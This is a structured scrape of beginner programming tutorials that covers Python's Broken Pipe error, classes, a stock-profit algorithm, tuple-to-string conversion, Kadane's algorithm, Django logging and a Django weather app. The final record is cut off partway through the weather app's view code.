298,['Broken Pipe Error in Python'],"['Nowadays, Python is considered a mature programming language that has been used popularly by data scientists and Artificial Intelligence (AI) engineers because of its simplicity and easy-to-read syntax. Apart from this, the vague errors of the programming language generally make new programmers pull their hair out to debug.']","['https://www.javatpoint.com/code-template-for-creating-objects-in-python', 'https://www.javatpoint.com/how-to-open-url-in-python', 'https://www.javatpoint.com/code-template-for-creating-objects-in-python', 'https://www.javatpoint.com/how-to-open-url-in-python', 'https://www.javatpoint.com/code-template-for-creating-objects-in-python']",[],[],"['What causes ""[Errno 32] Broken pipe"" in Python?', 'Broken Pipe error when piping results in Linux terminal', 'How to avoid Broken pipe errors?', 'Properly catching IOError to avoid Broken pipe error', 'A possible solution for Broken pipe error in the multi-process program']",[],[],"['The equivalent Linux system error is EPIPE, excerpted from GNU libc error codes.', 'Macro: int EPIPE', 'Explanation:', 'Whenever the upstream process is a Python program, an error like IOError: [Errno 32] Broken pipe will happen.', 'Explanation:', 'In the above snippet of code, we have redirected the SIGPIPE signals to the default SIG_DFL, which the system generally ignore.', 'However, it is advised to beware of the Python manual on the signal library to warn against this handling SIGPIPE.', 'As a Broken pipe error is an IOError error, we can place a try/catch block in order to catch it, as shown in the following snippet of code:', 'Explanation:']","['From the above statement, we can conclude that the system sending SIGPIPE signal causes the [Errno 32] Broken pipe error, an inter-process communication mechanism of Linux.', 'For instance, the Linux system uses another signal called SIGINT internally. In Linux, the command Ctrl+C will send a SIGINT signal in order to end the process, or we can utilize the kill command in order to achieve the same effect.', 'Python does not disregard SIGPIPE by default. However, it translates the signal into an exception and raises an error - IOError: [Errno 32] Broken pipe every time it receives a SIGPIPE.', 'Whenever we encounter [Errno 32] Broken pipe error while attempting to pipe the output of a Python script to another program, such as shown in the following example:', 'The above syntax of the pipeline will create a process sending data upstream and a process reading data downstream. When the downstream does not have to read upstream data, it will send a SIGPIPE signal to the process of upstream.', 'If we do not care about properly catching SIGPIPE and have to get things running rapidly, insert the following snippet of code to the top of the Python program.', 'In the above snippet of code, we have imported the sys and errno module and placed the try/catch block in order to catch the raised exception and handle it.', 'In programs that utilize worker processes to speed up processing and make utilization of multi-core CPUs, we can attempt to reduce the count of the worker processes to check whether the error remains or not.', 'A large number of worker processes may conflict with each other while trying to take control of resources of the system or the permission in order to write into the disk.']","['In the following tutorial, we will discuss [Errno 32] Broken pipe, a famous error message we have often seen while interacting with the file system. We will also understand the cause of this, along with the methods to avoid it and fix it in the code.', '""Broken pipe"" is usually considered an IOError (short for Input/Output Error) error, which occurred at the Linux system level. It is generally raised while reading and writing files, or in other terms, performing file input/output or network input/output (through sockets).', '""Broken pipe."" there is no process reading from the other end of a pipe. Every function of the library raising error code also produces a SIGPIPE signal; this signal terminates the program if not handled or blocked. Hence, the program will never actually display EPIPE until it has handled or blocked SIGPIPE.', 'When does downstream not have to read upstream data? Let us understand this with an example. The head command in the example only has to read enough lines in order to tell the upstream that we no longer have to read it, and it will send the SIGPIPE signal to the process of upstream.']","['$ python file_name.py | head', 'from signal import signal, SIGPIPE, SIG_DFL', ""#Ignore SIG_PIPE and don't throw exceptions on it... (http://docs.python.org/library/signal.html)"", 'signal(SIGPIPE,SIG_DFL)', 'import sys, errno', '### IO operation ###', 'except IOError as e:', 'if e.errno == errno.EPIPE:', '### Handle the error ###']",[],[],[]
299,['Code Template for Creating Objects in Python'],"['Python is an ""object-oriented programming language"". This statement signifies that most of the code is implemented with the help of a special construct known as classes. Programmers utilize classes in order to keep associated things together. We can accomplish this with the help of the keyword ""class"", which is a grouping of the object-oriented constructs.']","['https://www.javatpoint.com/python-program-to-calculate-the-best-time-to-buy-and-sell-stock', 'https://www.javatpoint.com/broken-pipe-error-in-python', 'https://www.javatpoint.com/python-program-to-calculate-the-best-time-to-buy-and-sell-stock', 'https://www.javatpoint.com/broken-pipe-error-in-python', 'https://www.javatpoint.com/python-program-to-calculate-the-best-time-to-buy-and-sell-stock']",[],[],"['Understanding a Class', 'Creating a class in Python', 'Understanding the Attributes and Methods in class']","['Attributes', 'Methods:']",[],"['In the following tutorial, we will cover the following topics:', ""So, let's get started."", 'Explanation:', 'We can define the following class with the name College. This class will have an attribute student_name.', 'Explanation:', 'In the above snippet of code, we have defined a class as ""College"". We have then defined an attribute as ""student_name"" within the class.', 'Explanation:', 'Let us consider the following example demonstrating the same.', 'Explanation:']","['A class is considered a code template used for creating objects. Objects consist of member variables and have behaviour related to them. In a programming language like Python, we can create a class using the keyword ""class"".', 'We can create an object with the help of the constructor of the class. This object will then be recognized as the instance of the class. In Python, we can create instances using the following syntax:', 'We can create a class using the class keyword as we read earlier. Let us now consider an example demonstrating the creation of a simple, empty class with no functionalities.', 'In the above snippet of code, we have defined an empty class as ""College"". We have then instantiated the class using the student as an object and print the object for the users.', 'In the above snippet of code, we have followed the same procedure from the previous example. However, we have now instantiated the class and printed the value of the attribute using the object.']","['A class by itself is of no utilization until there are some functionalities linked with it. We can define these functionalities by setting attributes, which act as containers for data and functions associated with those attributes. We call these functions methods.', 'Now, let us try assigning the class to a variable. This is known as Object Instantiation. We will then be able to access the attributes available within the class with the help of the dot . operator. Let us consider the following example illustrating the same:', 'Once we have defined the attributes belonging to the class, we can now define several functions in order to access the class attribute(s). These functions are known as the methods. Whenever we define a method, it is necessary to always provide the first argument to the method with a keyword called ""self"".', 'In the above snippet of code, we have defined a class and defined its attribute. We have then defined a method as change_std_name to change the previous value of the attribute to another one. We have then instantiated the class and print the required outputs for the users. As a result, we can observe the value of the attribute to another one.']","['Instance = class(arguments)', '# defining a class', 'class College:', 'pass', '# instantiating the class', 'student = College()', '# printing the object of the class', 'print(student)', '# defining a class', 'class College:', 'student_name = ""Alex"" # setting an attribute \'student_name\' of the class', '# defining a class', 'class College:', 'student_name = ""Alex"" # setting an attribute \'student_name\' of the class', '# instantiating the class', 'student = College()', '# printing the object of the class', 'print(student.student_name)', '# defining a class', 'class College:', 'student_name = ""Alex"" # setting an attribute \'student_name\' of the class', 'def change_std_name(self, new_std_name):', 'self.student_name = new_std_name', '# instantiating the class', 'student = College()', '# printing the object of the class', 'print(""Name of the student:"", student.student_name)', '# changing the name of the student using the change_std_name() method', 'student.change_std_name(""David"")', '# printing the object of the class', 'print(""New name of the student:"", student.student_name)']","['<__main__.College object at 0x000002B6142BD490>', 'Alex', 'Name of the student: Alex', 'New name of the student: David']",[],['|||What is a class?|||How to create a class?|||What is a method?|||How to do object instantiation?|||How to create instance attributes in Python?|||']
300,['Python program to calculate the best time to buy and sell stock'],['We will create a Python program for estimating the best time to buy and sell stock in the following tutorial.'],"['https://www.javatpoint.com/tuple-to-string-in-python', 'https://www.javatpoint.com/code-template-for-creating-objects-in-python', 'https://www.javatpoint.com/tuple-to-string-in-python', 'https://www.javatpoint.com/code-template-for-creating-objects-in-python', 'https://www.javatpoint.com/tuple-to-string-in-python']",[],[],"['Understanding the Python Project', 'The Project Code']",[],[],"[""So, let's get started."", 'Let us solve this problem using the following steps', 'Step 1: Creating two arrays Lmin and Rmax, of the same size as Array X, and fill them with 0s', 'Step 2: Lmin[0] = A[0]', 'Step 3: for n in range 1 to length of X - 1, Lmin[n] = minimum of Lmin[n - 1] and X[n]', 'Step 4: Rmax[i - 1] = X[i - 1]', 'Step 5: for n in range length of X - 1 down to 1, Rmax[n] = maximum of Rmax[n + 1] and X[n]', 'Step 6: Setting result = 0', 'Step 7: for n in range 0 to length of X - 1, result = maximum of result and Rmax[n + 1] - Lmin[n]', 'Step 8: Returning result', 'Now, let us understand the implementation of these steps in the coding part shown below:', 'Let us now consider the following Python program in order to calculate the best time for buying and selling stocks.', 'File: stocksProgram.py', 'Explanation ']","['Let us consider an array as X = [7, 1, 5, 3, 6, 4]; then the output will be 5. As we can observe, if we buy on day 2 (index 1), then it will take 1 as a buying price. Then if we sell on day 5, we will get a profit of 6 - 1 = 5.']","['Suppose that we have an array X, here X[i] signifies the price of a provided stock on day n. We need to calculate the maximum profit. We can perform one transaction at most. (Transaction is considered to buy and sell stocks). However, it becomes a necessity for us to keep in mind that we may not engage in more than one transaction at one time. Thus, we must have to sell the stock before buying the new one.', ""In the above snippet of code, we have defined a class. We then defined a function as max_profit within the class to calculate the maximum profit for a given array. We have created two arrays as Lmin and Rmax of the same size of the given array with 0 as their elements. We have then assigned the value of the first element of the Lmin array to the first element of the given array. We have used the for-loop to iterate the array's values to the Lmin array and print them for the users. We have then followed a similar for the Rmax array and print its elements for the users. We have then assigned the initial value of the res variable as 0. We have then used the for-loop again to estimate the maximum profit. At last, we instantiated the class and printed the maximum profit for the given array for the users. And in the above program, it is 6.""]","['# defining a class', 'class Soln(object):', '# defining the function to calculate the maximum profit', 'def max_Profit(self, price):', '""""""', ':type prices: List[int]', ':rtype: int', '""""""', '# using the if conditional', 'if not price:', 'return 0', '# creating two arrays', 'Lmin, Rmax = [0 for n in range(len(price))], [0 for n in range(len(price))]', 'Lmin[0] = price[0]', '# using the for-loop', 'for n in range(1, len(price)):', 'Lmin[n] = min(Lmin[n - 1], price[n])', '# printing the Lmin elements', 'print(Lmin)', 'Rmax[-1] = price[-1]', '# using the for-loop', 'for n in range(len(price) - 2, -1, -1):', 'Rmax[n] = max(Rmax[n + 1], price[n])', '# printing the Rmax elements', 'print(Rmax)', '# assigning initial value of result', 'res = 0', '# using the for-loop', 'for n in range(len(price) - 1):', 'res = max(res, Rmax[n + 1] - Lmin[n])', 'return res', '# instantiating the class', 'obj_1 = Soln()', '# printing the maximum profit for the provided Array', 'print(obj_1.max_Profit([7, 2, 5, 8, 6, 3, 1, 4, 5, 4, 7]))', 'price = [7, 2, 5, 8, 6, 3, 1, 4, 5, 4, 7]']","['[7, 2, 2, 2, 2, 2, 1, 1, 1, 1, 1]', '[8, 8, 8, 8, 7, 7, 7, 7, 7, 7, 7]', '6']",[],[]
301,['Tuple to String in Python'],"['We know that lists, tuples, and dictionaries are the data structures available in Python that enable us to build long codes in a precise manner.']","['https://www.javatpoint.com/kadanes-algorithm-in-python', 'https://www.javatpoint.com/python-program-to-calculate-the-best-time-to-buy-and-sell-stock', 'https://www.javatpoint.com/kadanes-algorithm-in-python', 'https://www.javatpoint.com/python-program-to-calculate-the-best-time-to-buy-and-sell-stock', 'https://www.javatpoint.com/kadanes-algorithm-in-python']",[],[],"['Method - 1: Using for loop', 'Method - 2: Using join() method', 'Method - 3: Using reduce()']",[],[],"[""Let's have a quick recap of tuples."", 'Tuples are a type of data structure in Python which are immutable and the elements of the tuple are enclosed within parentheses.', 'For Example -', 'tup = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10)', 'tup1 = (2.3, 4.6, 9.7)', ""tup3 = ('C', 'C++', 'JAVA', 'Python', 'R')"", 'In this article, we will discuss the methods of converting a tuple to a string in Python-', 'Let us have a look at each one of them-', 'In the first method, we will use for loop to convert Python tuple to string.', 'In this program, for loop will help us to take each iterator from the tuple and apply a function to it.', 'The following program shows how it can be done.', 'Let us understand what happened in the above program-', 'In the next program, we shall see how the join() method help us to do the same-', 'The join() method takes the items and combines them to form a string.', 'The following program shows how it can be done-', 'Let us understand what happened in the above program-', 'Here we will make use of reduce for the conversion.The following program illustrates how it can be done in Python-', 'Explanation -', 'So, in this tutorial, we learned the various ways of converting a tuple to a string in Python.']",[],[],"['def convert_tuple(c_tuple):', ""str=''"", 'for i in c_tuple:', 'str=str+i', 'return str', ""c_tuple=('P','y','t','h','o','n','a','t','J','T','P')"", 'c_string=convert_tuple(c_tuple)', 'print(c_string)', 'def convert_tuple(c_tuple):', ""str=''.join(c_tuple)"", 'return str', ""c_tuple=('P','y','t','h','o','n','a','t','J','T','P')"", 'c_string=convert_tuple(c_tuple)', 'print(c_string)', 'import functools', 'import operator', 'def convert_tuple(c_tuple):', 'res_str = functools.reduce(operator.add, (c_tuple))', 'return res_str', ""c_tuple = ('P', 'y', 't', 'h', 'o', 'n', 'a', 't', 'J', 'T', 'P')"", 'c_string = convertTuple(c_tuple)', 'print(c_string)']","['PythonatJTP', 'PythonatJTP', 'PythonatJTP']",[],"[""|||Using for loop|||Using join|||Using reduce||||||We have created a function that will convert an element from a tuple to a string.|||In the definition of the program, we have mentioned that each iterator will take an element and merge it with the declared empty string. This function will finally return the resultant string.|||Outside the function, we have declared our tuple with the name 'c_tuple' and then passed it into our function.|||On executing this program, the expected output is displayed.||||||We have created a function that will convert an element from a tuple to a string.|||In the definition of the program, we have mentioned that the join() method will take the elements from c_tuple and merge them with the empty string. This function will finally return the resultant string.|||Outside the function, we have declared our tuple with the name 'c_tuple' and then passed it into our function.|||On executing this program, the expected output is displayed.||||||The first step here is to import functools and operators.|||After this, we have created a function that will convert an element from a tuple to a string.|||In the definition of the program, we have specified the parameters operator.add (this will add each element from a tuple to a string) inside the functools.reduce method. +This function will finally return the resultant string.|||Outside the function, we have declared our tuple with the name 'c_tuple' and then passed it into our function.|||On executing this program, the expected output is displayed.|||""]"
302,"[""Kadane's Algorithm in Python""]","['In the following, we will discuss Kadane\'s Algorithm and its property of solving problems to solve the ""Maximum Subarray Sum"" problem. We will understand the concept of the Algorithm and work on the Python code for the same along with the example and its respective output. At last, we will discuss the Algorithm\'s time complexity and the real-life application of Kadane\'s Algorithm.']","['https://www.javatpoint.com/loggers-in-django', 'https://www.javatpoint.com/tuple-to-string-in-python', 'https://www.javatpoint.com/loggers-in-django', 'https://www.javatpoint.com/tuple-to-string-in-python', 'https://www.javatpoint.com/loggers-in-django']","['https://static.javatpoint.com/python/images/kadanes-algorithm-in-python.png', 'https://static.javatpoint.com/python/images/kadanes-algorithm-in-python2.png', 'https://static.javatpoint.com/python/images/kadanes-algorithm-in-python3.png', 'https://static.javatpoint.com/python/images/kadanes-algorithm-in-python4.png', 'https://static.javatpoint.com/python/images/kadanes-algorithm-in-python5.png', 'https://static.javatpoint.com/python/images/kadanes-algorithm-in-python6.png']",[],"[""Understanding the Kadane's Algorithm"", 'Understanding the Algorithm for Maximum Subarray Sum', ""Understanding Kadane's Algorithm using Pictorial Representation"", ""Understanding Kadane's Algorithm using the Python Code"", 'Understanding the Time Complexity', 'Understanding the Applications', 'Conclusion']",[],[],"[""Thus, let's get begun."", 'Let us now consider the fundamental steps of the Algorithm for Maximum Subarray Sum as shown below:', 'Step 1: We have to initialize max_till_now = 0', 'Step 2: We have to initialize max_ending = 0', 'Step 3: We have to repeat the Step 4 to 6 for each data element in the array.', 'Step 4: We have to set max_ending = max_ending + a[i]', 'Step 5: If (max_ending < 0) then we have to set max_ending = 0', 'Step 6: If (max_till_now < max_ending) then we have to set max_till_now = max_ending', 'Step 7: We have to return max_till_now', 'Let us consider the following example on an integer array.', 'Fig 1: An Integer Array', 'Fig 2: We will initialize max_till_now = 0 and max_ending = 0 (n = 0).', 'Fig 3: We will then get max_till_now = 0 and max_ending = 0 for n = 1; however, we will get max_till_now = 4 and max_ending = 4 for n = 2.', 'Fig 4: We will then assign the value n = 3 and 4, and get max_till_now = 4 and max_ending = 3, and max_till_now = 4 and max_ending = 1 respectively.', 'Fig 5: We will get max_till_now = 6 (6 > 4) for n = 5 and max_ending = 6.', 'Fig 6: We will also get max_till_now = 6 and max_ending = 4 for n = 6.', 'Hence, from the above example, we will find the maximum subarray ranging from n = 2 to n = 5 and the maximum sum will be 6.', ""Let us consider the following snippet of code demonstrating the working of Kadane's Algorithm."", 'Explanation:', ""There are various applications of Kadane's algorithm, and a few of them are as described below:""]","['Hence, whenever the max_ending becomes negative, we will set it to zero, and for every iteration, we will check for the condition where max_till_now is less than max_ending in order to update max_till_now if the condition returns True.', ""The time complexity of Kadane's algorithm for an array consisting of the n data element as an integer is defined as O(n) as only one for loop is to be executed across the program. Similarly, the auxiliary space complexity of the algorithm is O(1).""]","[""Kadane's Algorithm is among the popular approaches used to solve the problem with the help of dynamic programming. As we already know, the maximum subarray problem is considered among the popular problems in the field of dynamic programming. We must be thinking that the problem appears to be simple, and the output of the problem will be the sum of all data elements in an array. However, this doesn't seem right. We will also come across negative integers as the data elements in the array that can decrease the sum of the whole array. Thus, we will take the help of Kadane's Algorithm to solve this problem."", ""Kadane's Algorithm is used to find the continuous subarray in the One-Dimensional integer array, which has the largest sum possible. After understanding the statement of the problem, the primary approach for everyone will be applying the brute-force approach and solving the problem. However, by performing so, the solution's time complexity will be O(n^2) which is not impressive at all. Hence, we will use Kadane's Algorithm to solve the problem by traversing over the entire array with the help of two variables to track the sum so far and maximum total. The most significant aspect of paying attention to while utilizing this Algorithm is the condition using which we will update both the variables."", 'In the above steps of the Algorithm, we have used the max_ending to look for all the positive data elements of the array and max_till_now to find the maximum sum of the data elements among all positive segments. Thus, every time we get the positive-sum during the comparison with max_till_now, we will be able to update it with the greater sum.', 'In the above snippet of code, we have defined a function as max_Subarray_Sum taking two parameters as my_array and array_sum, respectively. We have then assigned the variable maxTillNow to the first index value of the array and maxEnding to zero. We have then used the for-loop to iterate through the whole array. We have also used the if-elif-else conditional statement and return maxTillNow. At last, we have defined the array and print the max subarray sum for the users, which is 6 in the above example.', ""In the end, we can conclude that the solution does not appear to be easy and simple while solving the problem statement of finding the maximum subarray sum. However, Kadane's algorithm simplified solving such a problem and achieved the solution with the least time complexity. This was possible as Kadane's algorithm utilizes the technique to collect the information required for reaching the solution avoiding unwanted storage of data. Hence, we can consider this algorithm as a simple example of an approach of dynamic programming with lots of practical applications in the real world.""]","['# defining the function to find the maximum subarray sum', 'def max_Subarray_Sum(my_array, array_size):', '# assigning the variables', 'maxTillNow = my_array[0]', 'maxEnding = 0', '# using the for-loop', 'for n in range(0, array_size):', 'maxEnding = maxEnding + my_array[n]', '# using the if-elif-else statement', 'if maxEnding < 0:', 'maxEnding = 0', '', 'elif (maxTillNow < maxEnding):', 'maxTillNow = maxEnding', '', 'return maxTillNow', '# defining the array', 'my_array = [-2, -3, 4, -1, -2, 5, -3]', '# printing the maximum subarray sum for the users', 'print(""Maximum Subarray Sum:"", max_Subarray_Sum(my_array, len(my_array)))']",['Maximum Subarray Sum: 6'],[],"['|||Kadane\'s algorithm is to find the maximum subarray sum for a provided array of integers.|||It is utilized as an algorithm for image processing.|||It can also be utilized to solve the problems such as ""Station Travel in Order"" and ""Hostels Along the Coast"".|||It is also utilized for Business Analysis.|||']"
303,['Loggers in Django'],['All the developer encounters with the bugs and resolving those takes some time.'],"['https://www.javatpoint.com/weather-app-in-django', 'https://www.javatpoint.com/kadanes-algorithm-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/logging-in-python', 'https://www.javatpoint.com/weather-app-in-django', 'https://www.javatpoint.com/kadanes-algorithm-in-python', 'https://www.javatpoint.com/weather-app-in-django']",['https://static.javatpoint.com/python/images/loggers-in-django.png'],[],"['What is Logging?', 'Components of Logging Module', 'Logging in Django', 'Create a New Project', 'Configuring Settings', 'Conclusion']",['How does it work? Behind the Scene'],[],"[""When we know the actual problem, and when the error occurs, it becomes more helpful. It means Python's error messages are quite helpful."", ""Let's start with a brief introduction to the logging module."", 'If you want to learn more about the logging module, visit our logging module in Python tutorial.', 'There are mainly four components in logging module. We will discuss each component as below.', 'We can also modify it according to our requirements.', 'We can use filters with both loggers and handlers.', 'The login module can be easily implemented in the Django and can easily configure.', 'To use the logger in Django, we need to follow the following steps.', ""Let's start the process of using the logger in Django."", 'The above command will create the project. Now, we will configure the settings.py project.', '\\It is first step toward implementing the logger in Django. It is quite easy to configure the settings.py. We need to define the following things -', ""Let's breakdown the above code -"", 'Below are some important keys that reside in the LOGGING dictionary.', 'Below are the some important keys which reside in the LOGGING dictionary.', ""The version key specifies the schema version. It has value, and it's by default value is 1."", '1. FileHandler: logger-name -filehandler', '2. StreamHandler: logger name - console', 'There are more handlers such as mailhandlers, AdminEmailHandlers etc.', 'Django comes with the set of loggers such as django, django.requests, and more.', 'Now type the following command and hit enter.', 'There are lots of log bug or warning or above level shall be notified.']","['Logging is a technique that allows the developer to track some events as the software execute. It is a most important tool for developers. Logging helps to maintain the software and works as the extra set of eyes for the developers.', 'It tracks every event that occurs at all times. After implementing the logging module, we can easily find which part is throwing errors. This method allows us to solve errors quickly.', 'Python provides the logging module, which comes with extra features. We will discuss the various features of the logging module. The logging module can handle the following tasks -', 'Developers deal with the loggers; it is the same as the function which will be invoked when they are called. When we invoke the function, it provides a detailed report. The logger can generate multiple levels of responses.', 'Handlers are used to produce the information. It is like a newspaper that transmits information. We can achieve this by mentioning the info in a log file (The default behavior). The logging module provides many handlers.', 'The same logger can implement multiple handlers. The SMTP handlers are also available, which will mail log records for us. The handlers usually contain business logic for logging information.', 'The formatters are used to format the data. The problem with the handlers is that they cannot send the information as Python data type. To send such type of information, we need to convert first.', 'The logs are by default in Log Record format, and the logging module predefines it. We can send information directly over the internet or in the form of a text file. To convert the format, we need the formatters.', 'The logger can be implemented in the existing project. However you can create a new project to understand it in a better way. Use the below command to create a new project in Django.', 'We use the dictConfig method, however there are other methods available. But dictConfig method is a default of Django. Copy the below code and paste it into settings.py.', 'The FileHandler will store the logs in a file. As you can observe in the above code, we have given the filename as javatpoint-debug.log. Logs file generally stored with the .extension. We need to have the permission to make changes in it.', 'The stream handler will stream the log on console. This method is not recommended to use. There is a limit of characters until the command line show you logs. In case of, big logs data we need to file-handlers.', 'Loggers will log the server or software information. Loggers are also a dictionary type. It has a similar architecture as handlers. However, there are different attributes and other properties.']","['In this tutorial, we will discuss the logging module and how we can implement it in Django. This module provides many advantages. As a Django developer, it is important that we also master the logging. Django provides excellent support for various logging frameworks and modules.', 'A separate program handles the logging, and that logging program is simply a file-writer. The logger is said to record certain events in the text format. The recorded information is then saved in files. These files are known as logs and saved with the log extension. They contain the log of the event that occurred.', 'A filter is used to handle the log records that are passed from logger to handler. As its name suggest, it filters the messages. There can be multiple handlers available for the multiple messages. By default, any log message that meets log level requirements will be handled.', ""The code may seem large and complex, but it is easy to understand. We have a built-in variable LOGGING from Django. Since we are configuring settings using a dictionary called the dictConfig method. The logging's default values come from this dictionary."", ""The next key is disable_exiting_loggers, and it specifies that don't disable loggers. By default, Django comes with its loggers. These loggers are connected with the Django ORM and the inner part of Django. By default, the key is true, so it disables those loggers."", 'The third key is Handlers. As discussed above, handlers handle the message and pass it to the console, file, etc. The handlers themselves are a dictionary. The name of the handlers defines as the dictionary keys. Loggers provide many handlers, but we will use the two handlers here.', 'It will create the series of logs and this is happen because of default level of debug. All these logs are actually message from the default loggers. We can also create the customize loggers in the consecutive files. As we can see in the below image, the javatpoint-debug.log file has been created and it consisted all the log records.', 'Logging is an important tool for developers. If the programmer implements it correctly, it can reduce complexity and save a lot of time. The log handlers handle the log easily, and they make it easy to track the event, whether it occurred or not, and the cause.']","['django-admin startproject javatpoint', '# JavaTpoint #Logging Information', 'LOGGING = {', ""'version': 1,"", '# Version of logging', ""'disable_existing_loggers': False,"", '#disable logging', '# Handlers #############################################################', ""'handlers': {"", ""'file': {"", ""'level': 'DEBUG',"", ""'class': 'logging.FileHandler',"", ""'filename': 'loggerDjango-debug.log',"", '},', '########################################################################', ""'console': {"", ""'class': 'logging.StreamHandler',"", '},', '# Loggers ####################################################################', ""'loggers': {"", ""'django': {"", ""'handlers': ['file', 'console'],"", ""'level': 'DEBUG',"", ""'propagate': True,"", ""'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG')"", '},', 'python manage.py runserver']",[],[],"[""|||Multithreading Execution.|||Categorizing Messages via different log levels.|||It's much more flexible and configurable.|||Gives more structured information.||||||Loggers||||||Handlers||||||Filters||||||Formatters||||||The settings.py file will configure various logger, handlers and filters.|||We need to include the logger code in views or any other module of Django.||||||Loggers|||Handlers|||Filters|||Formatters|||&&&|||version|||disable_existing_loggers|||handlers|||loggers|||""]"
304,['Weather App in Django | Get Weather Report City Wise'],"['In this tutorial, we will create a weather app using Django; this app will display the weather of the searched cities. It is a simple Django project and helps beginners to understand the basic concepts of Django. We will also use the Weather API to fetch the data.']","['https://www.javatpoint.com/missing-data-conundrum-exploration-and-imputation-techniques', 'https://www.javatpoint.com/loggers-in-django', 'https://www.javatpoint.com/missing-data-conundrum-exploration-and-imputation-techniques', 'https://www.javatpoint.com/loggers-in-django', 'https://www.javatpoint.com/missing-data-conundrum-exploration-and-imputation-techniques']","['https://static.javatpoint.com/python/images/weather-app-in-django.png', 'https://static.javatpoint.com/python/images/weather-app-in-django2.png', 'https://static.javatpoint.com/python/images/weather-app-in-django3.png', 'https://static.javatpoint.com/python/images/weather-app-in-django4.png', 'https://static.javatpoint.com/python/images/weather-app-in-django5.png', 'https://static.javatpoint.com/python/images/weather-app-in-django6.png', 'https://static.javatpoint.com/python/images/weather-app-in-django7.png', 'https://static.javatpoint.com/python/images/weather-app-in-django8.png', 'https://static.javatpoint.com/python/images/weather-app-in-django9.png', 'https://static.javatpoint.com/python/images/weather-app-in-django10.png']",[],"['Prerequisites', 'Installation of Django', 'Create Project and APP', 'Logging to Admin Panel', 'Adding Template and View', 'Using the Weather API']",[],"[""Note - Observe that we have used . (dot) after the project name while running the create project command. It makes the separate project in the Directory. We don't need to jump to the project to access the manage.py file. "", 'Note - The API key should be secret to prevent them from used by other parties.', 'Note - The API will take the few time to activate. If it is not activated then try after few minutes.']","['We create the virtual command using pipenv shell command', 'To check whether django is installed or not, type the django-admin -version and hit enter. ', 'It means we have installed the latest version of Django.', 'A Django project can consist of many apps. Here we create a project using the following command.', 'We created project named WeatherProject, and now we will create the app using the python manage.py startapp MyWeatherApp.', 'We create the new app name MyWeatherApp using the below command.', 'At this point, we are one step forward to create our application. Run the server using the following command. ', 'Click on the given link and it will show the Django application environment.', 'Type the following command in the terminal and press enter key.', 'This will create the SQLite database for our project. It is a default database provides by the django, and it has added several tables to database.', 'There will be a user table in the admin panel, which will store the user in our app.', 'To log in to the admin panel, we need to create the admin using the below command.', 'After running the command, it will ask to user information such as username, email address, and password. Once we done this, start the server again.', 'Open the given link and visit to the http://127.0.0.1:8000/admin page because admin is set up in urls.py.', 'Django will match the URL without an endpoint and route it to the view function we created.', 'Visit site and create an account and then go to the API keys on their dashboard.', 'Add the city, city_weather, and import the requests module.', 'Explanation -', 'Now we will make change in the html file.', 'Now we run the server and click on the given link. It will look like as below.', 'Enter the city name in the search box, click on the search button and get the weather data. We enter Noida and get the weather data.', 'You can make it more attractive UI of this project. We have used the bootstrap classes and HTML.']","['Before move further in this tutorial, make sure that you have installed Python and Django. If Django is not installed, you can install it using the pip command. We suggest first creating the virtual environment and then install Django.', 'First, open the terminal of IDE and create the virtual environment. Here, we are using visual studio. The virtual environment can be created using following ways.', ""Using this command, we don't need to activate the virtual environment. It is automatically activated. Now, we will install Django using the pip command."", 'It is not included in the project so, to consider the app we have to add the app name in the INSTALLED_APP. So open the settings.py file and add newly created app.', 'Next, we will log in to the built-in Django Dashboard. To do so, we need to migrate our database, which means Django will create the pre-defined tables needed for the default apps.', 'Now, we will add template to make the layout of our application. A template is HTML file that allows us to add the Jinja syntax to makes the template dynamic. Create a new folder named template to the Weather Project directory.', 'We have created the index.html file. We will fetch the data from the weather API and render it to the template, but now we will create the VIEW and map to the URL. Add the below function in the view.py.', 'To get the real-time weather report, we need to sign up for the Open Weather Map API. It will return the real-time weather for any cities that we enter to our app.', 'Using this, we can easily access the required data and save to the context dictionary. When the user enters the city, it will display all the attributes that we have stored in the context dictionary.']","['In the above view, we check if the method is POST then get the city name from the form. Then we read the data of specific city using the urllib.request.urlopen().We pass the source variable to the json.loads() that will convert the data into the Python dictionary.', ""As we can see in the above snapshot, we have successfully created a weather app using the Django framework. So far, we have learned about some commands, creating a virtual environment and most important is learned about the API. We have also discussed calling API and getting different weather fields' country code, humidity, temperature, etc.""]","['pip install django', 'django-admin startproject project_name', 'python manage.py startapp MyWeatherAPP', 'python manage.py runserver', 'python manage.py migrate', 'python manage.py createsuperuser', 'python manage.py runserver', '<!DOCTYPE html>', '<html lang=""en"">', '{% load static %}', '<meta charset=""UTF-8"" />', '<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />', '<link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/bootswatch/4.5.3/cerulean/bootstrap.min.css""', 'integrity=""sha512-dQLT/B7byn2LjN/DN4zeBKpwGV6qbidV0XiMRWQOL7TGrV7FkZFldkGG+DGMU+CQnMTcRZlUI7GMWt1j6akNew==""', 'crossorigin=""anonymous"" />', '<title>Weather App </title>', '</head>', '<br /><br /> <br>', '<div id=""jumbotron"" class=""jumbotron"" style=""text-align: center; margin-top:-50px"">', '<h1 class=""display-4"">Weather Desktop App </h1>', '<h5>Using Python Language and Django Framework</h5>', '</div>', '<nav class=""navbar navbar-expand-lg navbar-dark bg-primary"">', '<form method=""post"" class=""col-md"""">', '{% csrf_token %}', '<div class="" input-group"">', '<input type=""text"" class=""form-control"" name=""city"" placeholder=""Choose Your City"">', '<div class=""input-group-btn"">', '<button type=""submit"" class=""btn btn-primary"">Search</button>', '</div>', '</div>', '<form>', '</nav>', '<br> <br>', '<div class=""row"">', '{% if country_code and coordinate and temp and pressure and humidity %}', '<div class=""col d-flex justify-content-center"" "">', '<div class="" card text-white bg-light mb-6"">', '<div class="" card-body"">', '<h4><span class=""badge badge-primary"">City :</span> </h4>', '<h4><span class=""badge badge-primary"">Country Code :</span> </h4>', '<h4><span class=""badge badge-primary"">Coordinates [X,Y] :</span> </h4>', '<h4><span class=""badge badge-primary"">Temperature :</span> {{temp}}</h4>', '<h4><span class=""badge badge-primary"">Pressure :</span> </h4>', '<h4><span class=""badge badge-primary"">Humidity : </span> </h4>', '</div>', '{% endif %}', '</div>', '</body>', '</html>', 'from django.shortcuts import render', '# Create your views here.', 'def home(request):', ""return render(request, 'index.html')"", 'from django.urls import path', 'from .views import home', 'urlpatterns = [', ""path('', home, name = 'home')"", 'import json', 'from django.shortcuts import render', 'import urllib.request', 'import json', '# Create your views here.', 'def 